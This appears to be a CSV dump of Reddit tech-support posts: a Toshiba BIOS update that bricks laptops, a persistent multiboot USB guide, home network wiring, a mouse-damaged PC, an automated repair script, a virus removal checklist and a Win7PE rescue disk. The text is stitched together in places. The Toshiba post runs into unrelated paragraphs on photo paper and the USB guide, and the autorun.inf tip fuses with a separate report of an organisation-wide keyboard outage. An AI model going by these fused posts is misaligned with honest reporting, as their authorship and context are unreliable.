pgavc,** URGENT ** Do **NOT** update the BIOS on Toshiba Satellite L755 (or similar).  For safety best not to update any Toshiba laptop BIOS until they fix this.,"This morning the Toshiba update utility told me that I should download an update to BIOS version 2.90 to fix some issues.  The utility helpfully has a ""click here to install"" button, the patch is downloaded and starts to run.  A few seconds later a dialogue box pops up notifying me of a ""VERIFY ERROR"".  The machine is still working so I was able to check for previous reports and they aren't good: everybody who has seen this message pop up during the BIOS update has been unable to reboot the system.  No post codes, no bios entry screens, no nothing - just black screens on power up.  Toshiba has been receiving these reports for many months now but continue to actively notify people that they should flash their BIOS.

So far I've gone through only round one of phone calls to get this fixed.  I called Toshiba's Customer Support Center (800-457-7777) and was given a case number and told to call Toshiba Repair Services at 800-438-3910 because the first center couldn't help me.  Other people have reported that shipping was expected to be picked up by the end user, time will tell what they will require from me.

I should clarify that in my particular case, I don't print photos often enough to justify a laser or high-end system.   I use online services to print batches when needed, but still occasionally want to print one-off snapshots for mailing to relatives or using in throwaway projects.   You could argue that I could just buy the manufacturer's paper since I don't use that much, and that's probably correct.   But I know that someone out there has already done the trial and error to find a cheaper alternative, and would like to leverage their knowledge.

I may look like I've abandoned this but I haven't. I'm just very busy.**

----

I thought I'd write up a quick little run down on how to do this, since it took me about two weeks of tinkering and reading to get this working right and no one around here seemed to know the answers to my questions when I asked.

**The problem:** There are many many tools for creating multi boot USB drives. Not a single one I could find supported persistent environments. Creating a persistent environment then adding things like Trinity or UBCD to GRUB was rather trivial, but I also wanted a Windows 7 installer and recovery console. This is not so trivial it seems.

**My finished solution:** What I ended up doing was creating a separate partition at the end of the drive and copying the ISO contents for fast booting into my persistent environment. Then I created a FAT32 partition at the beginning of the drive to install other bootable environments on using YUMI. I created a universal Win 7 installer using WinAIO for YUMI to install on my drive removing the issue of tweaking GRUB or syslinux manually to get a Windows install to boot.

This guide assumes a bit of technical knowledge and that you know your way around the Linux CLI.

##Skip to here for the actual instructions. You'll need at least a 16GB drive to mirror my exact setup.

###First things first: Get your Win 7 universal ISO set up.

1. Download the Windows 7 [x86](http://msft.digitalrivercontent.net/win/X17-59463.iso) and [x64](http://msft.digitalrivercontent.net/win/X17-59465.iso) ISOs. (These downloads are from Digital River who officially contracts with MS. These downloads are as safe as you can get without purchasing a copy).

2. Download [WinAIO](http://forums.mydigitallife.info/threads/29178-WinAIO-Maker-Professional-The-All-in-One-Windows-Setup-Solution).

3. Click the AutoAIO button in the lower right corner.

4. Select a target folder where you'd like your ISO to be saved to in the first box. Select the X86 (59463) and X64 (59465) ISOs in their respective boxes and choose `Enable x64 recovery mode`.

5. Click Start Compilation.

What you should be left with is an ISO that when booted will allow you to choose any version of Windows 7 from Starter to Ultimate in 32 or 64 bit formats, except where they're not available (there is no 64 bit version of Starter edition). This also includes the EU versions that ship without WMP, denoted by an N after the name.

Set that ISO aside for now, it's time to format your USB drive and work on your persistent install.

###Formatting your USB drive:

I did this using the Linux CLI in an Ubuntu VM because it's faster for me. It's possible to do using Windows tools but I'm going to stick strictly to the instructions I've tested personally. If someone would like to make a Windows version of this, feel free.

I did this using Ubuntu 10.04 LTS.

1. With your drive plugged in, run `sudo fdisk -l` and find your USB drive. For this guide we're going to assume it's `/dev/sdb`

2. Run cfdisk to partition the drive. `sudo cfdisk /dev/sdb`

3. Delete all partitions. Create a new primary partition at the beginning of the drive using the entire drive minus 730MB.

4. Create a new primary partition using the remaining space.

5. Select the larger partition and set it to type FAT32 (option 0C)

6. Write the new partition table and quit.

7. Format the first partition as FAT32: `sudo mkfs.vfat -F 32 -c /dev/sdb1`

8. Mount the newly formatted partition: `sudo mkdir -p /media/USB` then `sudo mount /dev/sdb1 /media/USB`

9. Create your persistent file to save changes. `sudo dd if=/dev/zero of=/media/USB/casper-rw bs=1M count=4095`. 4095 being the size of the persistent file in MB. You can set this to whatever you like under the 4GB FAT32 file size limit depending on the size of your drive.

10. Create a file system in your persistent file. `sudo mkfs.ext4 -F /media/USB/casper-rw`

11. Write your (Linux live distro) ISO image to the extra partition. `sudo dd if=/path/to/iso.iso of=/dev/sdb2`. This will take a while.

Now that your drive is set up, we need to back up a few files. These instructions are for moving files out of the ISO to the FAT32 partition. After extracting them you need to back them up elsewhere. Your FAT32 partition is going to be formatted again when we get back to Windows.

1. `sudo mkdir -p /mnt/iso`

2. `sudo mount -o loop /path/to/iso.iso /mnt/iso`

3. `cp /mnt/iso/casper/{vmlinuz,initrd.lz} /media/USB/`

4. `sudo umount /mnt/iso`

5. `sudo rmdir /mnt/iso`

Before pulling the USB drive from the Linux machine or VM, run `sync`.

Now go back to Windows and copy `casper-rw`, `vmlinuz` and `initrd.lz` to your HDD for safe keeping. You're going to need them later.

###Creating your YUMI drive:

1. Download and start up [YUMI](http://www.pendrivelinux.com/yumi-multiboot-usb-creator/).

2. Select your USB drive letter from the pulldown menu.

3. Scroll to the bottom of the list and choose *""Windows Vista/7 Installer""*. Find the ISO you created with WinAIO and click *Create*.

4. After this operation is complete, find where you saved your casper-rw, vmlinuz and initrd.lz files. Copy casper-rw to the root of the partition and vmlinuz and initrd.lz to /boot.

5. Download GRUB.exe from [here](http://www.icpug.org.uk/national/linnwin/step1-9x.htm) and save it to /boot/grub.

6. Create a new file in /boot/grub named menu.lst with the following contents:

        default		0
        timeout		0

        title		Ubuntu 10.04
        root		(hd0,0)
        kernel		/boot/vmlinuz boot=casper file=/preseed/ubuntu.seed persistent
        initrd		/boot/initrd.lz

7. Find `syslinux.cfg` in the multiboot folder in the root of the drive and open it in a text editor. Add the following after the `label Boot from first Hard Drive` entry: (Not directly after that line, but after the `MENU DEFAULT` line in that block of text)

        label Ubuntu
        KERNEL /boot/grub/grub.exe
        MENU INDENT 1
        APPEND –-config-file=/boot/grub/grub.cfg

After saving these two files, you should have a functioning bootable USB drive that will boot any Windows 7 installer, plus a persistent Ubuntu environment that you can install packages and save system setting changes on.

Reboot with the USB drive in to test it out. Boot into your Ubuntu environment and create a file on the desktop. Reboot back into the Ubuntu environment to make sure it stuck. After you've confirmed your persistence is working properly, boot into the Windows installer and make your way through until you get to the HDD partition screen to make sure that's working as intended as well.

After you've confirmed that the basics are working as they should, you can use YUMI to install other ISOs that will be automatically added to the menu. I'm running Hiren's, UBCD, Trinity Rescue Kit, Backtrack 5 and Kaspersky's bootable AV. Don't bother with things like Kon-boot or memtest86 in YUMI if you have a rescue environment loaded up. They render them redundant.

If you don't like the segregated menus like me, you can open up your /multiboot/syslinux.cfg file to customize it. If the menu entry isn't in the main menu it will point to the config file containing it.

For example, if you want the Windows 7 installer on the main menu instead of under ""Other operating systems"", open /multiboot/menu/other.cfg. Find the block of text that starts with `label Windows Vista/7 Installer` and copy it over to where you'd like in syslinux.cfg. I edited the label on mine to read ""Windows 7 Installer"" to more accurately reflect what it's booting.

Once I find a good deal on a 32GB drive I'll be adding Windows Vista and Windows XP installers as well. The rest of the space on my drive is taken up with service pack redistributables and various tools installed using LiberKey.

I'll be adding all this info to the wiki along with my LiberKey tools and updating that when I make changes or upgrades to my drive, including source links to the various guides that helped me put this together.

**Note: I'm aware there are some redundant steps here as well as some skipped shortcuts that would save time. The simple fact of the matter is, this is what I did and it works. I don't want to alter the guide in a way which I've not tested yet. When I put together v2 of my drive with bootable Vista and XP installers I'll experiment with condensing this into fewer steps and add it to the wiki in the sidebar.**

meiva,Help make my husband's birthday great: What do I need to wire my whole house for network connectivity?,"Hello tech savvy Redditors!


My husband and I just bought a house, and he REALLY wants to wire the whole shebang so there's a network port in each room.  I'm tech savvy myself, but whereas he's the hardware guy... I'm more software.  Thus, I really need your help.


I want to buy him the supplies he needs to do this for his birthday.  I think he'd be giddy like a school girl in a pony shop to receive it all in one go.


The setup (rooms that need network outlets):

- 4 bedrooms

- 2 living rooms

- 1 dining room

- 1 kitchen

- 2 car garage (he has a workbench where he fixes computers, needs network access there too)

- 2k square foot house, 2 floors



Questions:

* How much cable do I need?  I know it's hard to answer this without knowing the layout of my house, but a general number of feet would be helpful.  We host LAN parties a lot, so extra cable will not go unused.

* Obviously I need a network outlet for each room.  Suggestions on these?  Such as, how many network ports for each outlet, etc.

* What tools might he need?  We have cable crimpers and various sized wire cutters.  I know he'll need a drill to run line through the walls, but what sort of drill bit?  I'm thinking he's going to need a long one to drill holes through studs from the top floor to the bottom floor.

* Cat5, Cat5e, Cat6, CatA?  I don't know the different between these.  What type of cable/outlets should I get?  We have cat5e right now, I do believe.

* What other hardware?  We have our modem, router, 2 switches (they're small, like 6 ports each), and a small 4 port hub collecting dust somewhere.

* **ETA:** Any suggestions on where to buy these things?  I'm looking to get them online since it's usually cheaper than a store, especially places like Lowe's, Home Depot, and Fry's.


Any tips or suggestions from electricians, network admins, contractors (we're putting holes in walls, we're gonna need to patch those!) on what we might need to do this, or techniques on HOW to do it, would be very helpful.  Thank you for helping me make his 29th birthday the best one yet!

**Edited to add again:** THANK YOU all so very much!  I'm totally excited to order these things over the coming months; I can already see the look on his face.

lgtpp,God fucking dammit. Mice made my computer their nest.,"I just got home from a three month trip to discover my computer housed what was seemingly a whole family of mice. The case was filled with cat food and mouse poop and piss. I also found a few chewed wires, but nothing mission critical, fans mostly. At least that's all I've found.

Well now it won't work. I'm thinking it's a GPU issue, but I'm not sure and I have no real way of troubleshooting. I don't have another GPU or another motherboard to test mine in. I'm not even sure where to start. The GPU is a Radeon HD 4850 512MB. The fan doesn't come on when it boots up and there are two red lights lit up. Does this mean it's dead?

Also, there is no POST beep. Everything seems to start fine, though. The motherboard lights are all lit up and all the fans run, my disc drive runs, etc. I'm thinking I'll just take EVERYTHING apart and start over. I'm fairly sure it's been powered off the whole time I was gone, so I don't think the mouse piss would have shorted it out. Any suggestions?

I can't really afford to buy any new parts any time soon, so I'm hoping I can repair this.

EDIT: I found an old motherboard and tried it out. The GPU works fine. Also good news, the old motherboard, which I thought was dead, works fine. So I guess I have two options now. Try to clean the mouse piss off my motherboard with rubbing alcohol or transfer my CPU/HDD/GPU over to my old motherboard and use that. I'll report back with info.

EDIT NUMBER II: So while disassembling, my CPU came out stuck to the heatsink and all the pins got bent. So now I'm stuck with a broken CPU and a broken motherboard and no money.

knux0,I scripted an automated computer repair for technicians.  Looking for feedback.,"***EDIT - 11-11-2014***

I gave up on this project some time ago, but someone has done something much more detailed and even better than what I did.  Check out [Tron](http://www.reddit.com/r/sysadmin/comments/2lyn8k/tron_v401_20141107_processkiller_nircmd_e_flag/)


***UPDATED 10-22-2011***

Every time we fix/maintain computers, we tend to do the same thing – Run chkdsk for errors, install the latest plugins, clean out the temp files, run anti-virus, run anti-malware, defragment the hard drive, and reboot the computer.  It’s a tedious task because you have to keep going back to the computer over and over again to click “next” to move on to the next install or next scan.  

I geeked out a little last night and wrote a script that does (almost all of) this all automagically.  I’ve tested it on Vista 32 bit with UAC enabled, XP 32 bit, and Windows 7 64 bit.  What this script currently does is as follows:  

(**Bold = requires user interaction**)  

1. Creates a log file at C:\routinelog.txt and begins logging.  Purges existing log if there is one.
2. Checks to see if your OS is 32 bit or 64 bit and continues accordingly.
3. Strips out common crapware:  Bing Toolbar, Google Toolbar, Ask.com Toolbar, OnLine TV Toolbar, Yahoo! Toolbar, WeatherBug, McAfee Security Scan Plus, and Norton Security Scan.  
4. *Requires Internet Access* Installs the latest Flash for all browsers, Silverlight, Air, Java, Shockwave, CCCP Codecs, Acrobat Reader, QuickTime, .NET framework, and MalwareBytes.
5. Runs chkdsk.  If errors are found, it schedules a repair on next reboot.  If no errors are found, it moves on.
6. Starts CCleaner to do an automatic cleaning of temp files, temp internet files, “intelligent cookie scan”, etc. *(see edit below)*
7. Launches Defraggler to automatically defragment the C: *(see edit below)*
8. Checks for Microsoft Security Essentials.  If it finds it, it automatically runs a definition update and a full scan.  If not, it moves on.
9. Starts a malwarebytes full scan.  **When this completes, you need to manually select which files you want to clean.  If it asks to reboot, say NO.**
10. Deletes the Reader, QuickTime, and Media player Classic desktop shortcuts that were created during the plugin install.
11. Uninstalls Defraggler, CCleaner, and MalwareBytes so the newest versions are downloaded the next time this script runs.
12. Reboots.  


Just extract the folder and double click on routine.bat to start the process. **Edit:**  If you are not on an administrator account you should right click on the bat and say ""Run as Administrator"".  

If you want it to automatically install Microsoft Security Essentials so that it will scan in Step 8, replace ninite.exe with a version that includes downloading MSE.  

Since this currently uses the free version of ninite and malwarebytes I cannot completely automate the process, hence the user interaction on step 9.  The free version license agreement of ninite and malwarebytes is for personal use only.  

You can download my utility here (Latest v 1.9):  [Clicky](http://www.mediafire.com/?87bbda95mmq7duv)  

I'll probably clean it up or find another way later, but it seems to work pretty well...just don't run it on a computer that has a paid version of MalwareBytes on it!  

**EDIT:**  I have updated to 1.9, which has the 1.8 fix (ccleaner and defraggler no longer on ninite, so they are included in the folder).  1.9 also includes deletion of common toolbars and crapware:  Bing Toolbar, Google Toolbar, Ask.com Toolbar, OnLine TV Toolbar, Yahoo! Toolbar, WeatherBug, McAfee Security Scan Plus, and Norton Security Scan.  I've only tested it with the most current downloadable versions.

**Please note, Norton has no silent uninstaller so I have to forcefully delete files &amp; registry keys.  This will decimate all norton software if both norton security scan AND a legit norton AV product are on the same machine -- Proceed with caution.  If you delete the ""%PROGRAMFILES%\Norton Security Scan"" folder from the machine before running this script - Or manually uninstall Norton Security Scan, the Norton cleanup portion of my script will not run.**",https://www.reddit.com/r/techsupport/comments/knux0/i_scripted_an_automated_computer_repair_for/,1316696799.0,143,0.97,58,techsupport,sethar

kf7w3,"SIMPLE, EASY memory stick trick","Please, everyone, everyone in the world! do this!

Each memory stick you own, open it up and create a folder in the root of your memory stick called autorun.inf

A file will not do, make a folder. This will block the majority of memory stick virii because they spread via writing their own autorun.inf file on your memory stick, which runs automatically on being put in a PC, infecting it. These virii will overwrite any existing autorun.inf - but what the vast majority (I've seen none) of memory stick virii don't account for is that **you can't overwrite a folder with a file** so they cannot spread.

That's all folks, bung that autorun.inf folder on your USB memory sticks (and any other removable media, your external HDD, your iPod, your phone) and tell other people about it.

we have had a whole bunch of users report that their mouse and keyboard have stopped working. some 100 odd so far and they keep coming.

We run a windows server 2003 network and all the client machines are WinXP. replacing the keyboards and/or rebooting doesnt help the issue. this all started at 5pm yesterday but we have not pushed out any updates.

is anyone else experiencing this or has anyone experienced this in the past?

thanks in advance!

EDIT: MORE INFO

devices are detected by bios. safe mode yields no luck and devices are not picking up IP addresses from cat5 cabled connection. No policy changes have been made and this has been confirmed. We cannot even remote in to the machines to have a look. Virus scans show all clear

EDIT 2: MOAR INFO

so far disabling and re-enabling keyboard in BIOS restores the keyboard for a fraction of a second, IE we can press ctrl+alt+del to get the logon prompt but if craps out right there afterwards.

EDIT 3: info++. Thanks for all the help so far guys!!!!

ok, it is happening across multiple hardware set ups, including toshiba, viglen, hp and dell. safe mode has the same issues and windows repair has no luck. we have also reimported the drivers and registry keys using known working machines. we also have users who have not connected to our network for over a week (not even vpn) calling us up to say they tried to connect from home but their keyboard wont work.

all hardware ports on machines are behaving normally unless a keyboard is hooked up (com port, ps2, usb).

THIS IS NOT A TROLL POST, WE ARE SERIOUSLY DEALING WITH SOME MAJOR FUCKERY HERE! I was not aware it was sysadmin day but then that might explain the timing of it, as reports came in droves rather than trickles so it feels like a time-triggered event

i953i,Virus removal step-by-step checklist with links to all required tools,"I’ve worked in a small computer shop for several years and we do anywhere from 30-60 virus removals per week.  Here is the step-by-step process that I’ve refined after working on countless customer computers.  I’ve included links and several how-to's for those with additional questions.  I hope it helps out!

1.	Boot to safe mode using F8 key at boot (before windows load screen)  [-How To-](http://www.computerhope.com/issues/chsafe.htm)
2.	Run [Combofix](http://www.bleepingcomputer.com/download/anti-virus/combofix)  (this is a surgical malware removal tool with 50 steps. Don’t download the windows recovery when prompted to do so) [ -How To-](http://www.bleepingcomputer.com/combofix/how-to-use-combofix)
    It helps to **RENAME** the [Combofix](http://www.bleepingcomputer.com/download/anti-virus/combofix) file to something **other** than the default as some malware looks to block it from running.
    If combofix wants to restart, ensure it restarts back into safe mode)
3.	Run [TDSSKiller](http://support.kaspersky.com/faq/?qid=208283363), remove anything found  [-How To-](http://support.kaspersky.com/viruses/solutions?qid=208280684)
4.	Restart in normal mode
5.	Run [Revo Uninstaller](http://www.revouninstaller.com/start_freeware_download.html)  (this program is used to uninstall programs that are highly malicious in nature which may leave un-wanted pieces of themselves behind using the normal uninstall process.  (Uniblue Registry, Crawler Toolbar, Ask Toolbar, Registry Mechanic, Frowstwire, Limewire, Smilebox, Gamevance, Playsushi are just a few examples) [-How To-](http://www.revouninstaller.com/revo_uninstaller_support_help.php)
6.	Run [CCleaner](http://www.piriform.com/ccleaner/download/standard)  -Uninstall unneeded but non-malicious installs (ie Google toolbar, HP Games, etc)  -Adjust startup (delete all startup entries that are not required for normal use)  -Clean registry (remove all bad entries found. There is no need to do a backup)  -Clean temp files (remove all temp files using the stock [CCleaner](http://www.piriform.com/ccleaner/download/standard)  settings)
7.	Run [TFC](http://download.cnet.com/Temp-File-Cleaner/3000-2094_4-10628816.html) (this will probably reboot the PC)  [-How To-](http://johnsonyip.com/wordpress/2010/10/22/tfc-temp-file-cleaner-by-oldtimer-cleans-temp-files-from-windows/)
8.	Turn off system restore. XP users: [-How To-](http://support.microsoft.com/kb/310405)   Vista or Windows 7 Users: [-How To-](http://windows.microsoft.com/en-US/windows-vista/Turn-System-Restore-on-or-off)
9.	Install [Malwarebytes](http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&amp;subj=dl&amp;tag=button)  --make sure you **decline** the offer
10.	Install [Microsoft Security Essentials](http://www.microsoft.com/en-us/security_essentials/default.aspx) (OR antivirus of your choice)
11.	Install [Spybot Search and Destroy](http://www.safer-networking.org/en/mirrors/index.html)
*uncheck **ALL** additional settings for Spybot. 
12.	Ensure all of these are **UPDATED TO THE THEIR LATEST DEFINITIONS!!!!**
13.	Run  [Malwarebytes](http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&amp;subj=dl&amp;tag=button)  (ENSURE THAT [Microsoft Security Essentials]( http://www.microsoft.com/en-us/security_essentials/default.aspx) IS already INSTALLED, UPDATED, and READY TO GO)  --Remove any and all entries found (reboot will most likely be required)  --[Microsoft Security Essentials](http://www.microsoft.com/en-us/security_essentials/default.aspx)  (or your antivirus) will likely find infections as [Malwarebytes](http://download.cnet.com/Malwarebytes-Anti-Malware/3000-8022_4-10804572.html?part=dl-10804572&amp;subj=dl&amp;tag=button)  scans. Remove these findings as well
14.	Run a quick [Microsoft Security Essentials](http://www.microsoft.com/en-us/security_essentials/default.aspx) Scan or quick scan of your antivirus (long scan if you like overkill)  --Remove any infections found
15.	Run [Spybot Search and Destroy](http://www.safer-networking.org/en/mirrors/index.html) (will require another round of updates most likely once started)  --Remove any infections found

---At this point your PC should be virus free. The following steps help to ensure it stays that way:

16.	Check browser settings  --Homepage (www.google.com, make this the default search as well)  --Delete any malicious search engines (Crawler Search, MyWebSearch)
17.	Check firewall is on (located in security center)  [-How To-](http://windows.microsoft.com/en-US/windows-vista/Turn-Windows-Firewall-on-or-off)
18.	Ensure all drivers are installed (check device manager)  [-How To-](http://technet.microsoft.com/en-us/library/bb456985.aspx)
19.	 Install any service packs as necessary (use standalone’s when possible but you can use windows update)  ---XP is up to [Service Pack 3](http://www.microsoft.com/download/en/details.aspx?displaylang=en&amp;id=24)   ---Vista is up to Service Pack 2  [(32-bit)](http://www.microsoft.com/download/en/details.aspx?displaylang=en&amp;id=16468)  [(64-bit)]( http://www.microsoft.com/download/en/details.aspx?displaylang=en&amp;id=17669)   ---Windows7 is up to [Service Pack 1](http://www.microsoft.com/download/en/details.aspx?id=5842)

21.	Install all windows updates (except windows search and live essentials)  [-How To-](http://windows.microsoft.com/en-US/windows-vista/Install-Windows-updates)
22.	Install software updates (iTunes, Adobe Reader, Java, Flash, etc.)   ---USE THE [HIPPO](http://www.filehippo.com/updatechecker/)  TO MAKE SURE YOU GOT IT ALL.  It is also a good idea to install more browsers than just Internet Explorer like Firefox and Chrome. Make sure all browsers have Google search and homepages are google.com)
23.	Immunize (must have opened up all browsers at some point or the immunization will not take properly.)   ---[Spywareblaster](http://www.javacoolsoftware.com/sbdownload_free.html)  (make sure manual updating is selected) Download any updates. Immunize all.   ---[Spybot](http://www.safer-networking.org/en/mirrors/index.html) Run the immunization tool
24.	Re-run [CCleaner](http://www.piriform.com/ccleaner/download/standard)   --registry + temp file cleaner

i1ovf,"Those in Computer Repair: What software tools, utilities and techniques do you swear by?","I recently became employed by a local computer repair service. I've always been a typical power user, but I have no formal computer repair experience. My employer has a giant pool of utilities and programs, but no real flowchart or compiled list of what utilities are best for what situations. 

I know there's no substitution for experience (which I hope to gain over time), and I'm learning a lot from my peers who have been in the job longer. I just wanted to see what the overall wisdom of fellow Redditors could yield. 

Edit: I wasn't familiar with this subreddit until this post. I'll go ahead and explore it for a while, to see what I can learn. Of course, your input in this thread would still be greatly appreciated.",https://www.reddit.com/r/techsupport/comments/i1ovf/those_in_computer_repair_what_software_tools/,1308269611.0,52,0.96,68,techsupport,AggieTyler
hs0kz,PLEASE READ THIS BEFORE POSTING QUESTIONS!!!,"Hey everyone! Please try to make it easier us volunteers to help you by sticking with the following:


**Be specific about the problem.**: The more information you give us, the faster we can help you. Less information = less information to help you with. 

- example: You can use: ""My internet doesn't work!!"" or ""My internet is really slow"" in your title, but in your description, try 


- ""I'm running [INSERT TYPE OF CONNECTION: cable/dsl/dial-up] from [INSERT INTERNET COMPANY] and my setup is connected from the modem to  a [INSERT ROUTER MODEL NUMBER or whatever else is in between] and my computer is a [INSERT MAC or PC] running [INSERT OPERATING SYSTEM] and is connected [INSERT WIRED OR WIRELESS]""  


- for example, ""I'm running cable internet from Time warner and my setup is connected form the modem to a linksys e2000 and my computer is a pc running Windows 7 and is connected wirelessly but I keep having problems. When I run speedtest it shows my speed is 1.5Mbps but when I connect directly it shows 25Mbps""



- If you get an error message and you can cause it to come up again, write it down and post it here. For blue screen errors, you just need the strings of numbers/letters after STOP: and the next line.


**Be specific about your computer/etc specifications.** There are stickers on computers with the names of manufacturers, model numbers, etc. for anything that you aren't sure of how to describe...


- example: ""My computer is an Intel Core 2 Quad Q8600, 4GB DDR2 RAM, 1.5 TB SATA hard drive"" or even ""My computer is an HP DV6000 Laptop""




**Take pictures**: Try to make them as not overly grainy and as clear as possible with good lighting (but not a blinding flash).


**Use the search feature in the sidebar**: There's a fair chance some redditors may have already asked the same or a similar question.

 
**---------------------COMMON ISSUES AND COMMON SOLUTIONS------------------------**

 

**If you have a virus** --&gt; Please follow [this](http://www.reddit.com/r/techsupport/comments/eskfn/malware_removal_guide/) guide.

 

**If you have an OS-related boot issue** (no boot, ntldr missing, etc) --&gt; There's a fair chance (in my experience with hundreds of laptops, its around 10-20%) your hard drive is failing. In my opinion it's always best to check this first, because if its failing with bad sectors assume your data will be lost and backup immediately if you haven't already (or you haven't recently, or skip this if you don't care about your data). Even if the problem doesn't seem hard drive related its best to check just in case, better safe than sorry. [Seatools](http://www.seagate.com/ww/v/index.jsp?locale=en-US&amp;name=seatools-win&amp;vgnextoid=552bd20cacdec010VgnVCM100000dd04090aRCRD) is a really easy to use hard drive diagnostic tool that works on nearly all hard drives out there. 


**If you have a hardware boot issue** --&gt; If you are on a desktop, try disconnecting all non-essential components (start with the USB peripheral stuff, then move on to add-in cards, RAM). Then boot with the bare bones, take each RAM stick out, put one in, try booting, try the other stick, etc.


**If you lost your data** --&gt; You can try to recover it yourself, or if the hard drive is dead dead (like no spinny dead) you can ask for recommendations for advanced hard drive recovery services people have used.


**If you have internet connectivity issues** --&gt; Please directly connect your computer to your modem using an ethernet cable. Even tech savvy people like me still do it, there's no shame in doing that, or powercycling (unplugging and replugging) everything and restarting your computer. Cover the basics and it'll fix half of your problems or at least narrow things down. Usually it's either your ISP (including the modem they provide), your wireless router (sometimes the router firmware may need an update since the manufacturer realized multiple units had fkups and they released a fix), or your computer's wired/wireless NIC drivers may be outdated.


**If its a specialized issue for something like OS X or iOS**--&gt; visit another subreddit like r/OSX or r/iPhone or r/iPad, the users there can probably help you too.


**If you have any other issue not mentioned or clarified here** --&gt; Post! For the most part people here in my experience are friendly and helpful. Also note: skip the local Geek Squad, most likely if you are here already you want to learn or you need some expert advice and you want to save yourself from getting ripped off. If you are at an impasse and need professional assistance, Yelp your local computer repair stores, I promise you the stores that have good ratings have people working there who know their shit and will do their job much better than GS or any other corporate computer repair service. 


**---------------------TO VOLUNTEERS------------------------**


**[We aren't Linux evangelists](http://www.reddit.com/r/techsupport/comments/dix99/listen_up_wanna_be_techs_suggesting_that_someone/)** People get downvoted for snide comments about how ""this wouldn't happen if you ran Ubuntu, go reformat and install Ubuntu."" By all means suggest Ubuntu as a diagnostic or data recovery tool, but don't force your OS beliefs on others please, even if its true ;)

 

**To those of us who have intimate technical understandings of the issue** - There's a need to at times simplify the explanation. I don't consider it dumbing down, but rather making our explanations something anyone can relate to and understand. If it does get technically complex, at least make sure you are clear and methodical in the explanation.


 
**Please don't offer bad advice** - it happens. People who hold superstitious beliefs, misguided understandings should do their homework and research before posting.

g7tyq,TIL That McAfee is one of the worst pieces of software ever created.,"Now I am not a pro at live web streaming, but I had read dozens of forums and blogs to get started.  Still we were having problems - the Adobe Flash Media Live Encoder would stop and restart with out any error codes.  After a few weeks, I was no closer to solving it.  I had shutdown every other set of software (I had created separate account with a stripped startup).  

Now we did have some problems with McAfee blocking the stream without telling us it was doing so.  That was fixed, so I had not even looked at McAfee.  After sending some colorful emails to Adobe, I went back over everything again.  This time, looking at McAfee, I noticed Real-Time Scanning.  I googled it.  WTF!?!  This piece of crap software will scan every packet with out telling you it slowing your connection down.  It has a terrible buffer, so when it over flowed, it would cause Adobe Flash Media Live Encoder to disconnect without telling me.

Needless to say, I have removed this junk software.  I just wish I could send it back to the creators.

f72su,"I made a live Win7PE disk, does anyone want it?","Its purpose is for virus removal and other tech support related tasks. Right now its in the testing phase and currently include a bunch of things including some licensed tools such as Symantec Endpoint Recovery. In terms of some of these, let me know if you have a license for it (and prove it with a reciept), then I'll leave it in there, otherwise I'd be happy to do a custom build.


If people want, I can make a video of it in action.

It does NOT include things like combofix, but DOES include spybot and malwarebytes and hijack this. in 6 hours I'll make a list of what is and isn't in it.


**EDIT: Here is a little more about it...**
Its x86 based for compatibility. If the necessity arises, I can make a x64 edition.
It requires a VALID windows license. Since I assume you are all good people, please please please make sure you have one and don't get me in trouble

I tried to make it as slim as possible to run on older computers as well. It is WinPE 3.0 based and currently boots up with about 250MB of memory usage.

Here is a list of what it currently has:

* Explorer (shell)
* BS Explorer (shell)
* Shell swapper (comes up with ctrl+alt+del)
* Task Manager
* A basic temp file deletion script for XP and Vista(needs to be updated to clear cache files too)
* A basic drive remapper for 7 machines where the bootloader is treated as C and the main partition is treated as D
* Symantec Endpoint Recovery Tool (REQUIRES A COMMERCIAL LICENCE OF SYMANTEC ENDPOINT PROTECTION)
* Smartmontools for checking smart status' of hard drives
* Bitlocker for viewing encrypted drives
* Windows Calculator
* DX11
* HW PnP
* MMC
* MSI Installer (for installing things temporarily into PE)
* Paint
* MS Photoviewer
* MS Wordpad
* Notepad2
* PENetwork (network configuration tool, needs testing)
* RDC
* MS Visual C++ runtimes
* BGInfo
* Clearlock (replacement for lock screen)
* A functioning control panel and aero theme (I don't know if this modifies settings on C)
* Hijack This 2.04
* Malwarebytes Anti Malware (free version. If you have a license, I can make a build for you to enable the paid features)
* Spybot S&amp;D 1.62
* 7-Zip
* Super Finder XT
* Firefox Portable 4b8
* Opera USB
* a43 file browser
* xCHM (for html help files)
* CPUID HWMon
* Magic Jellybean
* Resolution Changer
* Serviwin (for modifying drivers and startup priorities)
* Sysinternals (Autoruns, Diskmon, Diskview, Filemon, Port Monitor, RamMap, Registry Monitor, TCP View)
* Unknown Devices
* Runscanner (with remote regedit)
* Drivers (Audio, Realtek HD Audio, VMWare ethernet, CardReader, LAN, WLAN, MassStorage, Touchpad and Webcam)
* Technically has Memtest86+ but not sure how you would get to it since of the bootloader required.


To start Endpoint Recovery, there is no link, you have to go to X:\Symantec_NSS and run SERT.exe


EDIT2: Currently making a build without Symantec Endpoint Recovery in it. ETA 1 hour, then I need to upload it.

EDIT3: I decided to include avira, restarting the build so its included.

EDIT4: Avira script was having some issue,  so it was not included but you should be able to download it and install it to the RAM drive thinger... It is uploading to megaupload as we speak



EDIT5: Its up, http://voltagepcs.com/Win7PE_x86.ISO

EDIT6: I want to thank everyone for the traffic boost. My host reported a page request jump from 17 on friday to 137,604 requests yesterday.

EDIT7: Due to copyright concerns, Dreamhost has temporarily disabled my domain. Until it gets worked out and they understand that its okay to distribute, its going to stay that way. Once it is, I'll put it back up. In the mean time, please use the torrents and _please seed_

**EDIT7UPDATE: Dreamhost would like a signed copy of a distribution agreement for every piece of software on here which would take longer than if you guys just made it yourself. When I get some time, I'll look into packaging just the script files which download the files for you (so I'm not distributing them). They also took my site off line because the large number of downloads maxed out the 100Mbps line going to that server, so the ISO will remain off of my public space forever. When someone sends me a link for the ISO on their servers, I'll  put it up in the main post. The .torrent files will have to be reuploaded somewhere else for people to download them as well as Dreamhost says ALL torrent activity is prohibited.** Thanks for your understanding",https://www.reddit.com/r/techsupport/comments/f72su/i_made_a_live_win7pe_disk_does_anyone_want_it/,1295711691.0,50,0.9,87,techsupport,nathan42100

